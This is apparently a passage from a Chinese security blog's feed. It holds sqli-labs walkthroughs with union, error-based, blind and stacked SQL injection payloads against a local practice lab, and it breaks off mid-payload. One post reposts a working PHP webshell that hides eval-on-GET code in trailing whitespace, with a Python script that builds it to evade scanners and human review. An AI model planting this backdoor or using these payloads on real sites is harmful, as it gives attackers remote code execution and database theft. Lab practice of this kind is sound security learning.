title="Less-50"></a>Less-50</h2><p>从这里开始我们就开始新的，order by和叠加注入的挑战<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-50/?sort=1; insert into users values(1000,”root1”,”root1”)</span><br></pre></td></tr></table></figure></p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>不用猜就知道加了闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-51/?sort=1<span class="string">';create table test51 like users; --</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-82fd56e77b75ceb0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.PNG"></p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>这个50一样，只是没有报错，payload也一样。</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>这个和51一样，但是没有报错：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-53/?sort=1<span class="string">';create table test53 like users; --</span></span><br></pre></td></tr></table></figure></p><p>快结束了，还有最后page 4，也会在近期写完的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Sqli-labs实验Task3（less39-53）&quot;&gt;&lt;a href=&quot;#Sqli-labs实验Task3（less39-53）&quot; class=&quot;heade
      
    
    </summary>
    
      <category term="攻防实验" scheme="https://rliyuqing.github.io/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="sqli-labs" scheme="https://rliyuqing.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-labs实验Task4（less54-65）</title>
    <link href="https://rliyuqing.github.io/2019/04/15/9.%20Sqli-lab%E5%AE%9E%E9%AA%8CTask4%EF%BC%88less54-65%EF%BC%89/"/>
    <id>https://rliyuqing.github.io/2019/04/15/9. Sqli-lab实验Task4（less54-65）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:50:31.672Z</updated>
    
    <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="Sqli-labs实验Task4（less54-65）"><a href="#Sqli-labs实验Task4（less54-65）" class="headerlink" title="Sqli-labs实验Task4（less54-65）"></a>Sqli-labs实验Task4（less54-65）</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>Page 4又是不一样的挑战：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1cffad6074984f6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>可以看到这一串英文的提示是告诉我们需要在不到10次尝试中从数据库challenges中的随机表中获取秘钥，有趣的是，每次都会重置，challenge都会产生随机的表名、列名、表数据。一直保持新鲜。<br>分析分析可以知道，这个和ctf差不多，我们需要获取flag来提交才算成功。<br>首先第一次判断闭合情况，一次成功，单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=1’</span><br></pre></td></tr></table></figure></p><p>知道数据库名是challenges，下面获取表名：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a6241fcbf6640597.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br>获取了表名，果然是随机产生的，现在获取字段：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,column_name from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-06ae708b48b40d3c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"><br>可以看到第一个字段是id，还是直接获取所有列名把，有点蠢，以为一次就能出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-db7cee15feb21ce2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"><br>根据观察列名应该就是第三个secet_IKU1后面几位应该就是随机产生的，哈哈现在获取flag了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select id,sessid,secret_IKU1 from challenges.8al0pvg8mg -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1421a3be8fe22b3a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"><br>哈哈哈，后面直接提交就可以了啦！透个底，作者第一次成功的次数是8次，这个是第二次写博客的时候重新测试的。</p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一个和上一个差不多，不过将次数增加到了14次，可见难度肯定又有上升了！先来看看闭合情况：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-55/?id=1) -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>没有报错，很难受，就一个括号的闭合，我竟然猜了6次！！！！！太浪费了，太浪费了。后面就差不多了。54的payload可以直接用，更改一下闭合就行了。最后9次才出来，有点丢人。</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>同样是14次，按照之前的套路，这个时候应该是一个有报错的双重闭合。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-56/?id=1<span class="string">') -- #</span></span><br></pre></td></tr></table></figure></p><p>单引号加括号，没意思，大家可以自己玩玩。</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>我猜应该也是不同的闭合，每次套餐四个不是吗？<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-57/?id=1<span class="string">" -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一次就给力了，只有5次机会，这就基本要保证我们每一次都不能出现错误。<br>测试了一下还是单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-58/?id=1<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p><p>试一下54的payload发现不行！这样不行，那就得换方法了，发现可以报错，试试我们之前的updatexml的报错看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-58/?id=1<span class="string">' and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">')),1))-- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-2fbee840c7552ba2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"><br>成功，但是次数不够了，尴尬，只能重开一局了。<br>后面的话就直接修改updatexml里面的第二个参数的查询语句就可以啦，我就不废话了。</p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>这个比上面那个还简单，没有闭合。根据报错可以看出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-59/?id=1 and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'challenges'</span>)),1))-- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>和上面一样，闭合情况改为了双引号加括号：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-60/?id=1<span class="string">") -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>哇，这一次，我没有试出来，看了源码才弄出来闭合。。。。头皮发麻，单引号加两重括号，这第一次见：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-61/?id=1<span class="string">')) -- #</span></span><br></pre></td></tr></table></figure></p><p>其他的就和之前的一样。</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>我的天，这一次让我们130次的机会，我猜现在肯定就只能利用布尔的盲注，不然照实验这么抠的，怎么会给130次机会。。<br>可以看到，现在没有报错，只能自己猜闭合情况，然后union联合查询也没用，只能利用布尔盲注。<br>闭合是单引号加括号。<br>尝试获取信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-62/?id=1<span class="string">') and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">'),1,1))=79,0,sleep(10)) -- #</span></span><br></pre></td></tr></table></figure></p><p>这个时候肯定就只能利用脚本了。大家可以用sqlmap试试，我这里就没弄了。</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>这个和62一样，不过闭合变成了单引号。</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>这个也一样，闭合变成了双重括号！！！</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>双引号加括号！</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>本来看sqli-lab的分布图应该是有到less-75的，但是一直也没有找到，就暂且不论了。还有这次的sqli-lab的实验过程中，基本都是手动做的，因此很多需要布尔，时间的盲注的less都没有好好弄，之后有时间会整理出一套用工具的教程来完善一下。<br>就像我的学长曾经指导我一样，他没有具体去教我如何学习渗透，学习注入的知识，他很鄙视渗透，甚至都不愿教我们，但他又承认，这是安全工作者必备的技能。<br>安全学习过程中，路漫漫其修远兮！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Sqli-labs实验Task4（less54-65）&quot;&gt;&lt;a href=&quot;#Sqli-labs实验Task4（less54-65）&quot; class=&quot;heade
      
    
    </summary>
    
      <category term="攻防实验" scheme="https://rliyuqing.github.io/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="sqli-labs" scheme="https://rliyuqing.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>一个过人的小马</title>
    <link href="https://rliyuqing.github.io/2019/04/15/28.%E4%B8%80%E4%B8%AA%E8%BF%87%E4%BA%BA%E7%9A%84%E5%B0%8F%E9%A9%AC/"/>
    <id>https://rliyuqing.github.io/2019/04/15/28.一个过人的小马/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:52:37.565Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一个过人的小马"><a href="#一个过人的小马" class="headerlink" title="一个过人的小马"></a>一个过人的小马</h1><hr><p>转自：<br><a href="https://imbawenzi.github.io/2019/04/18/一个有趣的webshell---将代码隐藏在空白处/" target="_blank" rel="noopener">https://imbawenzi.github.io/2019/04/18/一个有趣的webshell---将代码隐藏在空白处/</a><br>分享一个小马，不但过狗还过人。<br>小马代码部分：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class newDataProvider &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">            <span class="variable">$f</span> = file(__FILE__);</span><br><span class="line">            <span class="variable">$r</span> = <span class="string">""</span>;</span><br><span class="line">            <span class="variable">$c</span> = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; count(<span class="variable">$f</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span> &lt; 15)&#123;</span><br><span class="line">                    <span class="variable">$r</span> .= <span class="variable">$this</span>-&gt;dataProcessor(<span class="variable">$f</span>[<span class="variable">$i</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$c</span> .= <span class="variable">$this</span>-&gt;dataProcessor(<span class="variable">$f</span>[<span class="variable">$i</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$t</span> = <span class="variable">$r</span>(<span class="string">''</span>,<span class="string">"<span class="variable">$c</span>"</span>);</span><br><span class="line">            <span class="variable">$t</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> dataProcessor(<span class="variable">$li</span>) &#123;</span><br><span class="line">            preg_match(<span class="string">'/([\t ]+)\r?\n?$/'</span>, <span class="variable">$li</span>, <span class="variable">$m</span>);</span><br><span class="line">            <span class="keyword">if</span> (isset(<span class="variable">$m</span>[1])) &#123;</span><br><span class="line">                <span class="variable">$l</span> = dechex(substr_count(<span class="variable">$m</span>[1], <span class="string">"\t"</span>));</span><br><span class="line">                <span class="variable">$r</span> = dechex(substr_count(<span class="variable">$m</span>[1], <span class="string">" "</span>));</span><br><span class="line">                <span class="variable">$n</span> = hexdec(<span class="variable">$l</span>.<span class="variable">$r</span>);</span><br><span class="line">                <span class="built_in">return</span> chr(<span class="variable">$n</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    new newDataProvider();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以重点关注dataProcessor这个函数，通过正则匹配文件每一行最后的/t或者空格数，并以这两个的计数的十六进制分别代表一位，来拼成一个ascii码。显然这些空格和/t的数量是我们可以自己写好的，这样我们就可以构造空格和/t的数量来构造一个小马或者其他恶意代码。转载的博主已经实现了，可以看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">funcName = <span class="string">'create_function'</span></span><br><span class="line">code = <span class="string">'eval($_GET["code"]);'</span></span><br><span class="line">blank = funcName+code</span><br><span class="line"></span><br><span class="line">fin = open(<span class="string">'test.php'</span>,<span class="string">'r'</span>)</span><br><span class="line">fout = open(<span class="string">'testOutput.php'</span>,<span class="string">'w'</span>)</span><br><span class="line">content = fin.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(content) &lt; len(blank):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(blank)-len(content)):</span><br><span class="line">content += [<span class="string">'\n'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(blank)):</span><br><span class="line">tensPlace = int(hex(ord(blank[i]))[2], 16)</span><br><span class="line">onesPlace = int(hex(ord(blank[i]))[3], 16)</span><br><span class="line"><span class="keyword">if</span> content[i][-1] == <span class="string">'\n'</span>:</span><br><span class="line">content[i] = content[i][0:-1] + tensPlace*<span class="string">'\t'</span> + onesPlace*<span class="string">' '</span> + <span class="string">'\n'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">content[i] = content[i] + tensPlace*<span class="string">'\t'</span> + onesPlace*<span class="string">' '</span> + <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">fout.write(line)</span><br><span class="line"></span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure></p><p>利用python脚本来实现从指定代码到空格和/t的添加。这样就在之前的那个文件里面构造了合适的空格和/t来表示恶意代码。生成新的文件便是我们最终的恶意文件了。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d1684b820a0ee255.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="111"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;一个过人的小马&quot;&gt;&lt;a href=&quot;#一个过人的小马&quot; class=&quot;
      
    
    </summary>
    
      <category term="webshell" scheme="https://rliyuqing.github.io/categories/webshell/"/>
    
    
      <category term="webshell" scheme="https://rliyuqing.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-lab实验Task1（less1-22）</title>
    <link href="https://rliyuqing.github.io/2019/04/15/6.%20Sqli-lab%E5%AE%9E%E9%AA%8CTask1%EF%BC%88less1-22%EF%BC%89/"/>
    <id>https://rliyuqing.github.io/2019/04/15/6. Sqli-lab实验Task1（less1-22）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:49:58.401Z</updated>
    
    <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="Sqli-lab实验Task1（less1-22）"><a href="#Sqli-lab实验Task1（less1-22）" class="headerlink" title="Sqli-lab实验Task1（less1-22）"></a>Sqli-lab实验Task1（less1-22）</h1><h2 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h2><p>直接贴上github地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol><li>直接下载一个phpstudy，当然使用其他的一键环境搭建也行，我比较推荐phpstudy。</li><li>把下载好的sqli-lab文件放入对应的www即网站根目录下就可，最后修改sql-connections/db-creds.inc文件当中的mysql账号密码。</li><li>开启phpstudy，将user和pass修改你的mysql 的账号和密码，访问127.0.0.1的页面，点击<br>setup/reset database for lab进行安装数据库的创建，至此，安装结束。我们就可以开始了。<h2 id="攻关开始"><a href="#攻关开始" class="headerlink" title="攻关开始"></a>攻关开始</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3>判断是否存在注入：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-1/?id=1](http://127.0.0.1/sqli-labs-master/Less-1/?id=1)<span class="string">'</span></span><br></pre></td></tr></table></figure></li></ol><p>即加一个单引号闭合一下变量试一试。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d8a91147d93aa12d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到报错了，我们可以猜测在id传参过程中使用的就是id={’$id’}这种方法。然后进行注入。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-1/?id=1<span class="string">'  order by 3 -- #</span></span><br></pre></td></tr></table></figure></p><p>后面的– #是两个注释，mysql中有– （注意两杠后面有一个空格）和#两种注释方法，我的习惯是两种都加，防止有过滤。也可以不使用过滤，但是需将最后还存在的一个单引号进行闭合防止出错。<br>获取数据库名，数据库用户等信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">'  union select 1,database(),user()  -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-414bee12e965de6b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到已经获取到了敏感的信息了，注意此时因为前面报错可以看到有limit 0,1我们可以知道此处如果需要输出我们union查询出的信息要将前面的位占了，即使前面的输出为不存在。可以看到我是将id的值写为负值，然后将输出的位置就让给了后面我们需要输出的信息，这个技巧在有输出限制的时候十分重要。<br>然后还有一点，我们上面猜测出了字段数为3，但这里输出的只有2个，所以我们union查询要保证字段数一样，不足的补数字，或者null。然后第一个是没有输出的，所以我将需要输出的写在了后面两个。<br>接下来的一些注入就很简单了，利用mysql自带的information_schema便可以得到很多我们需要的数据了，进行脱裤。这里可以利用information_schema这个库的原因是我们是root权限，如果不是root权限，只对指定数据库存在一定的权限，这时我们就要结合盲注进行测试了。盲注的话则需要利用工具来辅助，如sqlmap等。</p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-2/?id=1](http://127.0.0.1/sqli-labs-master/Less-2/?id=1)<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>看看这一次的报错和上一次的有什么不一样<br><img src="http://upload-images.jianshu.io/upload_images/6269327-732f7941ea107393.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这次的报错是：’’ LIMIT 0,1 ‘<br>可以看到这里第一个和最后一个单引号是语句里面的，中间一个使我们写入的，而且刚好是成对的，所以猜测这里的id是没有符号扩起来的。语句可能为id={$id}，所以我们之间在后面写入语句。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 3</span><br></pre></td></tr></table></figure></p><p>获取数据库名，数据库用户等信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,database(),user() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>这个较为简单，比上一个还为简单。结合上面一个的来分析看看，一般传参id为int型都是没有符号闭合。</p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-3/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>查看报错：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d1d60e829c26fd97.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>分析报错情况，这里是有一个括号5个单引号，其中一个是我们写入的，所以闭合应该是利用单引号和括号进行闭合的。继续进行测试。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-3/?id=1<span class="string">') order by 3 -- #</span></span><br></pre></td></tr></table></figure></p><p>获取数据库名，数据库用户等信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-3/?id=-1<span class="string">') union select 1,database(),user() -- #</span></span><br></pre></td></tr></table></figure></p><p>后面的可以继续尝试注入。</p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>我的天，这次竟然没有报错！没事换一个：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1”</span><br></pre></td></tr></table></figure></p><p>这次报错了：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-42a6461cb1b0f97a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>报错是：’”1””) LIMIT 0,1’<br>分析可知这个的传参是被括号和双引号闭合的。继续：<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1<span class="string">")  order by 3 -- #</span></span><br></pre></td></tr></table></figure></p><p>获取数据库名，数据库用户等信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-4/?id=-1<span class="string">")  union select 1,database(),user() --  #</span></span><br></pre></td></tr></table></figure></p><p>继续可以自己进行尝试。</p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>这个页面我们先说一下，无论我们id传的是多少，页面显示的都是YOU ARE IN……..没有输出！！！那我们怎么获取我们需要的数据信息！！！这个时候就只能盲注了，利用盲注来获取信息。<br>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>报错了less-1一样，可知sql语句应该是一样的所以我们可以利用一样的注入语句：<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1<span class="string">' order by 3 -- #</span></span><br></pre></td></tr></table></figure></p><p>页面返回YOU ARE IN……..说明正常，报错了就说明不对。接下来因为没有输出所以我们进行盲注，根据返回有没有报错来判断我们的语句是否正确。<br>一些简单的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1<span class="string">'  and length(user())&gt;0  -- # //判断是否为mysql</span></span><br><span class="line"><span class="string">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1'</span>  and ord(mid(user(),1,1))=114  -- <span class="comment">#</span></span><br><span class="line">$  //返回正常说明数据库权限为root</span><br></pre></td></tr></table></figure></p><p>获取敏感数据信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1<span class="string">' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))&gt;105 -- #</span></span><br></pre></td></tr></table></figure></p><p>我们来看一下这个语句的原理：<br>首先是ord函数，mysql中ord和ascii函数一样是将字符转换为ascii码。<br>然后mid函数和substring一样是截取字符串的指定位置的字符的函数，比如上面我们mid(string,6,1)表示截取string这个字符串的第六位开始截取一个。然后中间是获取我们当前的数据库名，并转换为字符（as char）后面的0x20十六进制ascii表示空格。<br>最后利用获取到的acsii码和我们指定的ascii进行对比来一个一个获取我们的想要的信息。比如我们这里和105对比，如果正确就继续猜，可利用二分法猜解效率更高。这里我们可以尝试看到=105时返回正常，说明当前数据库名的第六个字符就是105，查询表可知就是i。和前面得出的数据库名对比：security<br>接下来可以利用返回的正确与否来一步一步猜解出我们所需要的信息。但是这样往往很耗费时间，手工来基本不太可能，所以一般都是利用工具来可以利用sqlmap。这里主要讲的是手工，所以就不演示了。</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>判断是否存在注入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-6/?id=1<span class="string">" and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>这里利用了sleep函数，基于时间的盲注。我们可以看到使用sleep函数后网站延迟了5秒说明我们插入的语句被执行了。存在注入。<br>这里就说说mysql中的sleep函数在注入中的作用，一般在页面说明一点返回都没有，所以语句都无返回的时候就会利用到sleep这个函数来确定我们的语句有没有被执行。一般基于布尔的盲注比基于时间的盲注少见很多。<br>Less-6和less-5基本相同，只是闭合用的符号不同。所以就不多说了。</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>判断注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>我们可以发现只有在加单引号后报错，但是这次后台对报错进行了处理，使我们无法从报错中得出敏感的信息，所有错误都显示语法错误。但是我们发现只有在加单引号后报错，加双引号或者其他的都不报错，所有这个单引号肯定有问题，我们利用单引号进行进一步注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3<span class="string">' and sleep(5) -- #</span></span><br></pre></td></tr></table></figure></p><p>发现还是错误，我感到十分奇怪，于是没有利用过滤，而是构造语句将后面的遗留的一个单引号闭合进行测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3<span class="string">' and sleep(5) or '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure></p><p>返回正常，并且浏览器睡眠5s，说明语句执行成功。这时候应该可以猜测应该是注释的符号被过滤的，我换url编码也不行。所以这里不能继续使用注释，需要自己构造将后面的单引号进行闭合。<br>获取敏感数据信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3<span class="string">' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 